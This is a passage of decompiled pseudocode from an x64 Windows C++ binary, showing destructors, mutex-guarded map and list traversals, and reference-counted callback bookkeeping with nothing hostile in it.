    operator delete(*(void **)(a1 + 56));
  *(_QWORD *)(v1 + 80) = 15i64;
  *(_QWORD *)(v1 + 72) = 0i64;
  *(_BYTE *)(v1 + 56) = 0;
  v2 = *(volatile signed __int32 **)(v1 + 40);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (000000014001FF20) ----------------------------------------------------
void __fastcall sub_14001FF20(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rcx

  v1 = a1;
  v2 = *(void **)(a1 + 16);
  if ( v2 )
  {
    operator delete(v2);
    *(_QWORD *)(v1 + 16) = 0i64;
    *(_QWORD *)(v1 + 24) = 0i64;
    *(_QWORD *)(v1 + 32) = 0i64;
  }
  sub_14001FD70((void **)v1);
}

//----- (000000014001FF60) ----------------------------------------------------
void __fastcall sub_14001FF60(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 *v2; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 48) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 24));
  *(_QWORD *)(v1 + 48) = 15i64;
  *(_QWORD *)(v1 + 40) = 0i64;
  *(_BYTE *)(v1 + 24) = 0;
  v2 = *(volatile signed __int32 **)(v1 + 8);
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
    if ( !_InterlockedDecrement(v2 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
  }
}

//----- (000000014001FFD0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14001FFD0(__int64 a1))()
{
  __int64 v1; // rdi
  signed __int64 v2; // rcx
  void *v3; // rcx
  __int64 (__fastcall **result)(); // rax
  char v5; // [rsp+30h] [rbp+8h]

  v1 = a1;
  v2 = a1 + 144;
  *(_QWORD *)(v2 - 144) = &off_1400A56D8;
  *(_QWORD *)(v2 - 136) = off_1400A5728;
  _Mtx_destroy(v2);
  _Mtx_destroy(v1 + 136);
  sub_140021F60((__int64 **)(v1 + 120), (__int64 *)&v5, **(_QWORD **)(v1 + 120), *(_QWORD *)(v1 + 120));
  operator delete(*(void **)(v1 + 120));
  v3 = *(void **)(v1 + 72);
  if ( v3 )
  {
    operator delete(v3);
    *(_QWORD *)(v1 + 72) = 0i64;
    *(_QWORD *)(v1 + 80) = 0i64;
    *(_QWORD *)(v1 + 88) = 0i64;
  }
  sub_14001FD70((void **)(v1 + 56));
  if ( *(_QWORD *)(v1 + 48) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 24));
  *(_QWORD *)(v1 + 40) = 0i64;
  *(_QWORD *)(v1 + 48) = 15i64;
  *(_BYTE *)(v1 + 24) = 0;
  *(_QWORD *)(v1 + 8) = &off_1400B0E50;
  result = &off_1400A56B0;
  *(_QWORD *)v1 = &off_1400A56B0;
  return result;
}
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();
// 1400A56D8: using guessed type __int64 (__fastcall *off_1400A56D8)(void *);
// 1400A5728: using guessed type __int64 (__fastcall *off_1400A5728[2])();
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (00000001400200D0) ----------------------------------------------------
__int64 __fastcall sub_1400200D0(__int64 *a1, __int64 a2)
{
  _QWORD *v2; // rsi
  __int64 *v3; // rdi
  __int64 *v4; // rax
  __int64 *v5; // rbx
  const void **v7; // rax
  __int64 v8; // [rsp+40h] [rbp+8h]
  _QWORD *v9; // [rsp+50h] [rbp+18h]

  v2 = (_QWORD *)a2;
  v3 = a1;
  v4 = sub_140021CD0(a1, a2);
  v5 = v4;
  if ( v4 != (__int64 *)*v3 && (signed int)sub_14000B9E0(v2, v4 + 4) >= 0 )
    return (__int64)(v5 + 8);
  v9 = v2;
  v7 = (const void **)sub_14001EA10(v3, (__int64)&unk_1400DA317, &v9);
  sub_14001F320((__int64)v3, &v8, v5, v7 + 4, (__int64)v7);
  return v8 + 64;
}

//----- (0000000140020168) ----------------------------------------------------
void *__fastcall sub_140020168(__int64 a1, char a2)
{
  return sub_140020180((void *)(a1 - 8), a2);
}

//----- (0000000140020180) ----------------------------------------------------
void *__fastcall sub_140020180(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14001FFD0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (00000001400201B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400201B0(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400A56B0;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();

//----- (00000001400201E0) ----------------------------------------------------
void __fastcall sub_1400201E0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbp
  __int64 v3; // r14
  signed __int64 v4; // r15
  int v5; // eax
  __int64 *v6; // rax
  __int64 *v7; // rbx
  __int64 *v8; // rbx
  _QWORD *v9; // rdx
  size_t v10; // r8
  __int64 **v11; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  int v14; // eax
  __int64 *v15; // [rsp+30h] [rbp-88h]
  void *Dst; // [rsp+50h] [rbp-68h]
  __int64 v17; // [rsp+60h] [rbp-58h]
  unsigned __int64 v18; // [rsp+68h] [rbp-50h]

  v2 = a2;
  v3 = a1;
  v4 = a1 + 144;
  v5 = Mtx_lock(a1 + 144);
  if ( v5 )
    std::_Throw_C_error(v5);
  v6 = sub_140021CD0((__int64 *)(v3 + 120), (__int64)v2);
  v7 = v6;
  if ( v6 == *(__int64 **)(v3 + 120) || (signed int)sub_14000B9E0(v2, v6 + 4) < 0 )
    v15 = *(__int64 **)(v3 + 120);
  else
    v15 = v7;
  if ( v15 != *(__int64 **)(v3 + 120) )
  {
    v8 = *(__int64 **)v15[8];
    while ( v8 != (__int64 *)v15[8] )
    {
      v9 = v8 + 4;
      if ( (unsigned __int64)v8[7] >= 0x10 )
        v9 = (_QWORD *)*v9;
      v18 = 15i64;
      v17 = 0i64;
      LOBYTE(Dst) = 0;
      if ( *(_BYTE *)v9 )
      {
        v10 = -1i64;
        do
          ++v10;
        while ( *((_BYTE *)v9 + v10) );
      }
      else
      {
        v10 = 0i64;
      }
      sub_140004F20(&Dst, v9, v10);
      sub_1400209A0(v3);
      if ( v18 >= 0x10 )
        operator delete(Dst);
      if ( !*((_BYTE *)v8 + 25) )
      {
        v11 = (__int64 **)v8[2];
        if ( *((_BYTE *)v11 + 25) )
        {
          for ( i = (__int64 *)v8[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
          {
            if ( v8 != (__int64 *)i[2] )
              break;
            v8 = i;
          }
          v8 = i;
        }
        else
        {
          v8 = (__int64 *)v8[2];
          for ( j = *v11; !*((_BYTE *)j + 25); j = (__int64 *)*j )
            v8 = j;
        }
      }
    }
  }
  v14 = Mtx_unlock(v4);
  if ( v14 )
    std::_Throw_C_error(v14);
}
// 1400209A0: using guessed type __int64 __fastcall sub_1400209A0(char);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (00000001400203B0) ----------------------------------------------------
void __fastcall sub_1400203B0(__int64 a1)
{
  __int64 v1; // rdi
  signed __int64 v2; // rsi
  int v3; // eax
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  _QWORD *v7; // rbx
  int v8; // eax

  v1 = a1;
  v2 = a1 + 136;
  v3 = Mtx_lock(a1 + 136);
  if ( v3 )
    std::_Throw_C_error(v3);
  v4 = *(_QWORD **)(v1 + 56);
  v5 = (_QWORD *)*v4;
  if ( (_QWORD *)*v4 != v4 )
  {
    do
    {
      if ( *((_BYTE *)v5 + 64) )
      {
        *((_BYTE *)v5 + 64) = 0;
        (*(void (**)(void))(*(_QWORD *)v5[6] + 32i64))();
      }
      v5 = (_QWORD *)*v5;
    }
    while ( v5 != *(_QWORD **)(v1 + 56) );
  }
  v6 = *(_QWORD **)(v1 + 56);
  v7 = (_QWORD *)*v6;
  if ( (_QWORD *)*v6 != v6 )
  {
    do
    {
      (*(void (**)(void))(*(_QWORD *)v7[6] + 48i64))();
      v7 = (_QWORD *)*v7;
    }
    while ( v7 != *(_QWORD **)(v1 + 56) );
  }
  v8 = Mtx_unlock(v2);
  if ( v8 )
    std::_Throw_C_error(v8);
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140020470) ----------------------------------------------------
_QWORD *__fastcall sub_140020470(__int64 a1, _QWORD *a2, const void **a3)
{
  const void **v3; // rbp
  _QWORD *v4; // rdi
  __int64 v5; // rbx
  signed __int64 v6; // rsi
  int v7; // eax
  __int64 v8; // rax
  __int64 v9; // rcx
  int v10; // eax
  signed __int64 v12; // [rsp+30h] [rbp-18h]
  __int64 v13; // [rsp+50h] [rbp+8h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = a1 + 136;
  v12 = a1 + 136;
  v7 = Mtx_lock(a1 + 136);
  if ( v7 )
    std::_Throw_C_error(v7);
  sub_140022470((_QWORD *)(v5 + 56), &v13, v3);
  v8 = v13;
  if ( v13 == *(_QWORD *)(v5 + 56) )
  {
    *v4 = 0i64;
    v4[1] = 0i64;
  }
  else
  {
    *v4 = *(_QWORD *)(v13 + 48);
    v9 = *(_QWORD *)(v8 + 56);
    v4[1] = v9;
    if ( v9 )
    {
      _InterlockedIncrement((volatile signed __int32 *)(v9 + 8));
      v6 = v12;
    }
  }
  v10 = Mtx_unlock(v6);
  if ( v10 )
    std::_Throw_C_error(v10);
  return v4;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140020540) ----------------------------------------------------
void __fastcall sub_140020540(__int64 a1)
{
  __int64 v1; // rdi
  int v2; // eax
  __int64 v3; // rdx
  __int64 v4; // r8
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  char v7; // al
  int v8; // eax
  signed __int64 v9; // [rsp+28h] [rbp-20h]

  v1 = a1;
  v9 = a1 + 136;
  v2 = Mtx_lock(a1 + 136);
  if ( v2 )
    std::_Throw_C_error(v2);
  *(_BYTE *)(v1 + 16) = 1;
  v5 = *(_QWORD **)(v1 + 56);
  v6 = (_QWORD *)*v5;
  if ( (_QWORD *)*v5 != v5 )
  {
    do
    {
      if ( !*((_BYTE *)v6 + 64) )
      {
        v7 = (*(__int64 (__cdecl **)(_QWORD, __int64, __int64))(*(_QWORD *)v6[6] + 40i64))(v6[6], v3, v4);
        *((_BYTE *)v6 + 64) = v7;
        if ( v7 )
          (*(void (__fastcall **)(_QWORD, __int64))(*(_QWORD *)v6[6] + 24i64))(v6[6], v1);
      }
      v6 = (_QWORD *)*v6;
    }
    while ( v6 != *(_QWORD **)(v1 + 56) );
  }
  *(_BYTE *)(v1 + 16) = 0;
  v8 = Mtx_unlock(v9);
  if ( v8 )
    std::_Throw_C_error(v8);
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (00000001400205F0) ----------------------------------------------------
void __fastcall sub_1400205F0(__int64 a1, __int64 *a2, _QWORD *a3, _QWORD *a4)
{
  _QWORD *v4; // r14
  _QWORD *v5; // rbp
  __int64 *v6; // rbx
  __int64 v7; // rsi
  int v8; // eax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 ****v11; // rbx
  __int64 v12; // rsi
  __int64 v13; // rdx
  __int64 ***v14; // rax
  volatile signed __int32 *v15; // rbx
  int v16; // eax
  signed __int64 v17; // [rsp+20h] [rbp-F8h]
  char v18; // [rsp+38h] [rbp-E0h]
  __int64 v19; // [rsp+48h] [rbp-D0h]
  volatile signed __int32 *v20; // [rsp+50h] [rbp-C8h]
  char v21; // [rsp+58h] [rbp-C0h]
  void *Dst; // [rsp+60h] [rbp-B8h]
  __int64 v23; // [rsp+70h] [rbp-A8h]
  unsigned __int64 v24; // [rsp+78h] [rbp-A0h]
  char v25; // [rsp+80h] [rbp-98h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( *a2 )
  {
    v17 = a1 + 136;
    v8 = Mtx_lock(a1 + 136);
    if ( v8 )
      std::_Throw_C_error(v8);
    v19 = *v6;
    v9 = v6[1];
    v20 = (volatile signed __int32 *)v9;
    if ( v9 )
      _InterlockedIncrement((volatile signed __int32 *)(v9 + 8));
    v21 = 0;
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(Dst) = 0;
    sub_140004DF0(&Dst, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v10 = sub_14001FB50(&v25, v5, (__int64)&v19);
    v11 = (__int64 ****)(v7 + 56);
    v12 = **(_QWORD **)(v7 + 56);
    v13 = sub_14001EA90((__int64)v11, v12, *(_QWORD *)(v12 + 8), (__int64)v10);
    v14 = v11[1];
    if ( (unsigned __int64)(177372539170284149i64 - (_QWORD)v14) < 1 )
    {
      std::_Xlength_error("list<T> too long");
      __debugbreak();
    }
    v11[1] = (__int64 ***)((char *)v14 + 1);
    *(_QWORD *)(v12 + 8) = v13;
    **(_QWORD **)(v13 + 8) = v13;
    sub_14001EBA0((__int64)v11, (__int64)&v18, (unsigned __int64 *)**v11 + 2, **v11);
    sub_14001FE80(&v25);
    if ( v24 >= 0x10 )
      operator delete(Dst);
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(Dst) = 0;
    v15 = v20;
    if ( v20 )
    {
      if ( !_InterlockedDecrement(v20 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v15 + 8i64))(v15);
        if ( !_InterlockedDecrement(v15 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v15 + 16i64))(v15);
      }
    }
    v16 = Mtx_unlock(v17);
    if ( v16 )
      std::_Throw_C_error(v16);
  }
}
// 14001FE80: using guessed type __int64 __fastcall sub_14001FE80(_QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (00000001400207C0) ----------------------------------------------------
void __fastcall sub_1400207C0(__int64 a1, _BYTE *a2, _BYTE *a3)
{
  _BYTE *v3; // rsi
  _BYTE *v4; // rdi
  __int64 v5; // r14
  signed __int64 v6; // rbp
  int v7; // eax
  size_t v8; // rbx
  size_t v9; // r8
  _QWORD **v10; // rax
  int v11; // eax
  char v12; // [rsp+48h] [rbp-80h]
  void *v13; // [rsp+58h] [rbp-70h]
  __int64 v14; // [rsp+68h] [rbp-60h]
  unsigned __int64 v15; // [rsp+70h] [rbp-58h]
  void *Dst; // [rsp+78h] [rbp-50h]
  __int64 v17; // [rsp+88h] [rbp-40h]
  unsigned __int64 v18; // [rsp+90h] [rbp-38h]

  if ( a2 )
  {
    v3 = a3;
    v4 = a2;
    v5 = a1;
    if ( a3 )
    {
      v6 = a1 + 144;
      v7 = Mtx_lock(a1 + 144);
      if ( v7 )
        std::_Throw_C_error(v7);
      v18 = 15i64;
      v17 = 0i64;
      LOBYTE(Dst) = 0;
      v8 = -1i64;
      if ( *v4 )
      {
        v9 = -1i64;
        do
          ++v9;
        while ( v4[v9] );
      }
      else
      {
        v9 = 0i64;
      }
      sub_140004F20(&Dst, v4, v9);
      v15 = 15i64;
      v14 = 0i64;
      LOBYTE(v13) = 0;
      if ( *v3 )
      {
        do
          ++v8;
        while ( v3[v8] );
      }
      else
      {
        v8 = 0i64;
      }
      sub_140004F20(&v13, v3, v8);
      v10 = (_QWORD **)sub_1400200D0((__int64 *)(v5 + 120), (__int64)&v13);
      sub_14001F870(v10, (__int64)&v12, 0, (const void **)&Dst);
      if ( v15 >= 0x10 )
        operator delete(v13);
      v15 = 15i64;
      v14 = 0i64;
      LOBYTE(v13) = 0;
      if ( v18 >= 0x10 )
        operator delete(Dst);
      v11 = Mtx_unlock(v6);
      if ( v11 )
        std::_Throw_C_error(v11);
    }
  }
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140020960) ----------------------------------------------------
void __fastcall sub_140020960(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  if ( a2[2] && *(_QWORD *)(a4 + 16) )
  {
    if ( *(_QWORD *)(a3 + 16) )
      sub_1400209A0(a1);
    else
      sub_1400201E0(a1, a2);
  }
}
// 1400209A0: using guessed type __int64 __fastcall sub_1400209A0(char);

//----- (0000000140020B60) ----------------------------------------------------
void __fastcall sub_140020B60(__int64 a1, _BYTE *a2)
{
  __int64 v2; // rdi
  size_t v3; // r8
  char v4; // bl
  signed __int64 v5; // rcx
  void *v6; // [rsp+40h] [rbp-49h]
  __int64 v7; // [rsp+50h] [rbp-39h]
  unsigned __int64 v8; // [rsp+58h] [rbp-31h]
  void *v9; // [rsp+60h] [rbp-29h]
  __int64 v10; // [rsp+70h] [rbp-19h]
  unsigned __int64 v11; // [rsp+78h] [rbp-11h]
  void *v12; // [rsp+80h] [rbp-9h]
  __int64 v13; // [rsp+90h] [rbp+7h]
  unsigned __int64 v14; // [rsp+98h] [rbp+Fh]
  void *Dst; // [rsp+A0h] [rbp+17h]
  __int64 v16; // [rsp+B0h] [rbp+27h]
  unsigned __int64 v17; // [rsp+B8h] [rbp+2Fh]

  if ( a2 )
  {
    v2 = a1;
    v8 = 15i64;
    v7 = 0i64;
    LOBYTE(v6) = 0;
    v11 = 15i64;
    v10 = 0i64;
    LOBYTE(v9) = 0;
    v14 = 15i64;
    v13 = 0i64;
    LOBYTE(v12) = 0;
    v17 = 15i64;
    v16 = 0i64;
    LOBYTE(Dst) = 0;
    if ( *a2 )
    {
      v3 = -1i64;
      do
        ++v3;
      while ( a2[v3] );
    }
    else
    {
      v3 = 0i64;
    }
    sub_140004F20(&Dst, a2, v3);
    v4 = sub_140021230((__int64)&v6, &Dst);
    if ( v17 >= 0x10 )
      operator delete(Dst);
    if ( v4 )
    {
      v5 = v2 - 8;
      if ( v10 )
      {
        if ( v13 )
        {
          if ( v7 )
            sub_1400209A0(v5);
          else
            sub_1400201E0(v5, &v9);
        }
      }
    }
    if ( v14 >= 0x10 )
      operator delete(v12);
    v14 = 15i64;
    v13 = 0i64;
    LOBYTE(v12) = 0;
    if ( v11 >= 0x10 )
      operator delete(v9);
    v11 = 15i64;
    v10 = 0i64;
    LOBYTE(v9) = 0;
    if ( v8 >= 0x10 )
      operator delete(v6);
  }
}
// 1400209A0: using guessed type __int64 __fastcall sub_1400209A0(char);

//----- (0000000140020CE0) ----------------------------------------------------
void __fastcall sub_140020CE0(__int64 a1, _BYTE *a2, _BYTE *a3)
{
  _BYTE *v3; // rbx
  _BYTE *v4; // rsi
  __int64 v5; // rdi
  int v6; // eax
  int v7; // er14
  size_t v8; // r8
  __int64 *v9; // rdi
  __int64 *v10; // rax
  __int64 v11; // rbx
  __int64 v12; // rdi
  unsigned __int64 v13; // r13
  void *v14; // r9
  _QWORD *v15; // rdx
  size_t v16; // r15
  const void *v17; // rcx
  size_t v18; // r8
  size_t v19; // r12
  signed int v20; // eax
  size_t v21; // r8
  __int64 *v22; // rax
  __int64 *v23; // rbx
  __int64 *v24; // rsi
  unsigned __int64 v25; // r10
  void *v26; // r9
  _QWORD *v27; // rdx
  size_t v28; // r15
  const void *v29; // rcx
  size_t v30; // r8
  size_t v31; // r12
  int v32; // eax
  int v33; // eax
  __int64 *v34; // [rsp+20h] [rbp-49h]
  __int64 v35; // [rsp+28h] [rbp-41h]
  __int64 v36; // [rsp+30h] [rbp-39h]
  char v37; // [rsp+38h] [rbp-31h]
  __int64 v38; // [rsp+40h] [rbp-29h]
  void *Buf1; // [rsp+48h] [rbp-21h]
  size_t Size; // [rsp+58h] [rbp-11h]
  unsigned __int64 v41; // [rsp+60h] [rbp-9h]
  void *Dst; // [rsp+68h] [rbp-1h]
  size_t v43; // [rsp+78h] [rbp+Fh]
  unsigned __int64 v44; // [rsp+80h] [rbp+17h]

  if ( a2 )
  {
    v38 = -2i64;
    v3 = a3;
    v4 = a2;
    v5 = a1;
    if ( a3 )
    {
      v36 = a1 + 144;
      v6 = Mtx_lock(a1 + 144);
      if ( v6 )
        std::_Throw_C_error(v6);
      v37 = 1;
      v41 = 15i64;
      v7 = 0;
      Size = 0i64;
      LOBYTE(Buf1) = 0;
      if ( *v3 )
      {
        v8 = -1i64;
        do
          ++v8;
        while ( v3[v8] );
      }
      else
      {
        v8 = 0i64;
      }
      sub_140004F20(&Buf1, v3, v8);
      v9 = (__int64 *)(v5 + 120);
      v34 = v9;
      v10 = sub_140021CD0(v9, (__int64)&Buf1);
      v11 = (__int64)v10;
      v12 = *v9;
      v13 = v41;
      v14 = Buf1;
      if ( v10 == (__int64 *)v12 )
        goto LABEL_56;
      v15 = v10 + 4;
      v16 = v10[6];
      if ( (unsigned __int64)v10[7] >= 0x10 )
        v15 = (_QWORD *)*v15;
      v17 = &Buf1;
      if ( v41 >= 0x10 )
        v17 = Buf1;
      v18 = v10[6];
      v19 = Size;
      if ( Size < v16 )
        v18 = Size;
      if ( v18 )
      {
        v20 = memcmp(v17, v15, v18);
        v14 = Buf1;
      }
      else
      {
        v20 = 0;
      }
      if ( !v20 )
      {
        if ( v19 >= v16 )
          v20 = v19 != v16;
        else
          v20 = -1;
      }
      v35 = v11;
      if ( v20 < 0 )
LABEL_56:
        v35 = v12;
      if ( v13 >= 0x10 )
        operator delete(v14);
      v41 = 15i64;
      Size = 0i64;
      LOBYTE(Buf1) = 0;
      if ( v35 != *v34 )
      {
        v44 = 15i64;
        v43 = 0i64;
        LOBYTE(Dst) = 0;
        if ( *v4 )
        {
          v21 = -1i64;
          do
            ++v21;
          while ( v4[v21] );
        }
        else
        {
          v21 = 0i64;
        }
        sub_140004F20(&Dst, v4, v21);
        v22 = sub_140021CD0((__int64 *)(v35 + 64), (__int64)&Dst);
        v23 = v22;
        v24 = *(__int64 **)(v35 + 64);
        v25 = v44;
        v26 = Dst;
        if ( v22 == v24 )
          goto LABEL_57;
        v27 = v22 + 4;
        v28 = v22[6];
        if ( (unsigned __int64)v22[7] >= 0x10 )
          v27 = (_QWORD *)*v27;
        v29 = &Dst;
        if ( v44 >= 0x10 )
          v29 = Dst;
        v30 = v22[6];
        v31 = v43;
        if ( v43 < v28 )
          v30 = v43;
        if ( v30 )
        {
          v32 = memcmp(v29, v27, v30);
          v26 = Dst;
          v25 = v44;
        }
        else
        {
          v32 = 0;
        }
        if ( !v32 )
        {
          if ( v31 >= v28 )
          {
            LOBYTE(v7) = v31 != v28;
            v32 = v7;
          }
          else
          {
            v32 = -1;
          }
        }
        v34 = v23;
        if ( v32 < 0 )
LABEL_57:
          v34 = v24;
        if ( v25 >= 0x10 )
          operator delete(v26);
        if ( v34 != *(__int64 **)(v35 + 64) )
          sub_14000CB70((_QWORD *)(v35 + 64), (__int64 *)&v34, (__int64)v34);
      }
      v33 = Mtx_unlock(v36);
      if ( v33 )
        std::_Throw_C_error(v33);
    }
  }
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140020F80) ----------------------------------------------------
void __fastcall sub_140020F80(__int64 a1, _BYTE *a2)
{
  _BYTE *v2; // rdi
  __int64 v3; // rbx
  int v4; // eax
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  size_t v7; // r8
  _QWORD *v8; // rbp
  __int64 v9; // rdi
  __int64 v10; // rsi
  __int64 v11; // r15
  unsigned __int64 v12; // r12
  size_t v13; // r14
  void **v14; // r13
  _QWORD *v15; // rcx
  void **v16; // rdx
  size_t v17; // rbp
  size_t v18; // r8
  signed int v19; // eax
  _QWORD *v20; // rdx
  size_t v21; // rsi
  void **v22; // rcx
  size_t v23; // r8
  signed int v24; // eax
  __int64 *v25; // rdi
  __int64 v26; // rdi
  __int64 **v27; // rax
  __int64 *j; // rax
  __int64 i; // rax
  int v30; // eax
  _BYTE *v31; // [rsp+20h] [rbp-98h]
  __int64 v32; // [rsp+28h] [rbp-90h]
  __int64 v33; // [rsp+30h] [rbp-88h]
  __int64 v34; // [rsp+38h] [rbp-80h]
  __int64 v35; // [rsp+40h] [rbp-78h]
  char v36; // [rsp+48h] [rbp-70h]
  __int64 v37; // [rsp+50h] [rbp-68h]
  char v38; // [rsp+58h] [rbp-60h]
  void *Buf2; // [rsp+60h] [rbp-58h]
  size_t Size; // [rsp+70h] [rbp-48h]
  unsigned __int64 v41; // [rsp+78h] [rbp-40h]

  if ( a2 )
  {
    v37 = -2i64;
    v2 = a2;
    v31 = a2;
    v3 = a1;
    v32 = a1;
    v35 = a1 + 144;
    v4 = Mtx_lock(a1 + 144);
    if ( v4 )
      std::_Throw_C_error(v4);
    v36 = 1;
    v5 = *(_QWORD **)(v3 + 120);
    v6 = (_QWORD *)*v5;
    if ( (_QWORD *)*v5 != v5 )
    {
      do
      {
        v41 = 15i64;
        Size = 0i64;
        LOBYTE(Buf2) = 0;
        if ( *v2 )
        {
          v7 = -1i64;
          do
            ++v7;
          while ( v2[v7] );
        }
        else
        {
          v7 = 0i64;
        }
        sub_140004F20(&Buf2, v2, v7);
        v8 = v6 + 8;
        v9 = v6[8];
        v10 = *(_QWORD *)(v9 + 8);
        v11 = v6[8];
        v12 = v41;
        v13 = Size;
        v14 = (void **)Buf2;
        if ( !*(_BYTE *)(v10 + 25) )
        {
          do
          {
            v15 = (_QWORD *)(v10 + 32);
            v16 = &Buf2;
            if ( v12 >= 0x10 )
              v16 = v14;
            v17 = *(_QWORD *)(v10 + 48);
            if ( *(_QWORD *)(v10 + 56) >= 0x10ui64 )
              v15 = (_QWORD *)*v15;
            v18 = v13;
            if ( v17 < v13 )
              v18 = *(_QWORD *)(v10 + 48);
            if ( v18 )
              v19 = memcmp(v15, v16, v18);
            else
              v19 = 0;
            if ( !v19 )
            {
              if ( v17 >= v13 )
                v19 = v17 != v13;
              else
                v19 = -1;
            }
            if ( v19 >= 0 )
            {
              v11 = v10;
              v10 = *(_QWORD *)v10;
            }
            else
            {
              v10 = *(_QWORD *)(v10 + 16);
            }
          }
          while ( !*(_BYTE *)(v10 + 25) );
          v8 = v6 + 8;
        }
        if ( v11 == v9 )
          goto LABEL_63;
        v20 = (_QWORD *)(v11 + 32);
        v21 = *(_QWORD *)(v11 + 48);
        if ( *(_QWORD *)(v11 + 56) >= 0x10ui64 )
          v20 = (_QWORD *)*v20;
        v22 = &Buf2;
        if ( v12 >= 0x10 )
          v22 = v14;
        v23 = *(_QWORD *)(v11 + 48);
        if ( v13 < v21 )
          v23 = v13;
        if ( v23 )
          v24 = memcmp(v22, v20, v23);
        else
          v24 = 0;
        if ( !v24 )
        {
          if ( v13 >= v21 )
            v24 = v13 != v21;
          else
            v24 = -1;
        }
        if ( v24 < 0 )
        {
LABEL_63:
          v34 = v9;
          v25 = &v34;
        }
        else
        {
          v33 = v11;
          v25 = &v33;
        }
        v26 = *v25;
        if ( v12 >= 0x10 )
          operator delete(v14);
        if ( v26 != v6[8] )
          sub_14000CB70(v8, (__int64 *)&v38, v26);
        if ( !*((_BYTE *)v6 + 25) )
        {
          v27 = (__int64 **)v6[2];
          if ( *((_BYTE *)v27 + 25) )
          {
            for ( i = v6[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( v6 != *(_QWORD **)(i + 16) )
                break;
              v6 = (_QWORD *)i;
            }
            v6 = (_QWORD *)i;
          }
          else
          {
            v6 = (_QWORD *)v6[2];
            for ( j = *v27; !*((_BYTE *)j + 25); j = (__int64 *)*j )
              v6 = j;
          }
        }
        v2 = v31;
      }
      while ( v6 != *(_QWORD **)(v32 + 120) );
    }
    v30 = Mtx_unlock(v35);
    if ( v30 )
      std::_Throw_C_error(v30);
  }
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140021220) ----------------------------------------------------
void __fastcall sub_140021220(__int64 a1, char a2)
{
  *(_BYTE *)(a1 + 152) = a2;
}

